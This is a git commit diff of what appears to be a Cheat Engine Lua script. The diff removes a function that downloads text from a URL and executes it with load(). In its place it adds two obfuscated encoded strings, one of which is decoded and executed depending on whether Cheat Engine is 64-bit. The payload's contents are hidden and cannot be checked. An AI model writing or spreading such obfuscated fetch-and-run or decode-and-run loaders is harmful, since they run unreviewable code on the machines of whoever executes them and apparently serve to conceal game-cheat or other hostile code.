305b6de4d39505b92a5b1298762e2ac2d7865043
Mr-A S T R O <96073683+MrAstroOfficial@users.noreply.github.com>
2022-02-19 15:30:47 +0530

    Update SERVER - 4.lua

--- SERVER - 4.lua
+++ SERVER - 4.lua
@@ -1,8 +1,7 @@
-function ROLEX()
-local url = 'LUA'
-local int = getInternet()
-local text = int.getURL(url)
-int.destroy()
-load(text)()
+local script32bit = 'c-oWpDNPJ!ketlRCB=/U!otB)5ypT38s!d+2p%I7E0ELyVh#p_1}vu/1^H={1}rBT29P2awjh5W+9Z]k5i9@E+ugqkd7*f42M30fh6aZAh64--fczyuy}ht6V0Z#F:oo[_SnCs?+b{J1APYqTGD:DcimmkZixSKA)lbjkN_Q;9Q.U-G@GZ[lO7xQRbM/_T9E)ee@8M4(GLthCbM)PZ)a%lH%,n8c4GMD(QZ,Kr1!7aZoYF*Vp7hibPoU/aywnmFb_5D-$cKd@B@6^uB?1g#eqsuew^ZXf2#!8)'
+local script64bit = 'c-oWpDNPJ!ketlRCB=/U!NS2(5ypT38s!d+2p%I7E0ELyVh#p_1}vu/1^H={1}rBT29P2awjh5W+9Z]k5i9@E+ugqkd7*f42M30fh6aZAh64--fczyuy}ht6V0Z#F:oo[_SnCs?+b{J1APYqTGD:DcimmkZixSKA)lbjkN_Q;9Q.U-G@GZ[lO7xQRbM/_T9E)ee@8M4(GLthCbM)PZ)a%lH%,n8c4GMD(QZ,Kr1!7aZoYF*Vp7hibPoU/aywnmFb_5D-$cKd@B@6^uB?1g#eqsuew^ZXf4MIM0'
+
+if   cheatEngineIs64Bit() then
+     decodeFunction(script64bit)()
+else decodeFunction(script32bit)()
 end
-ROLEX()
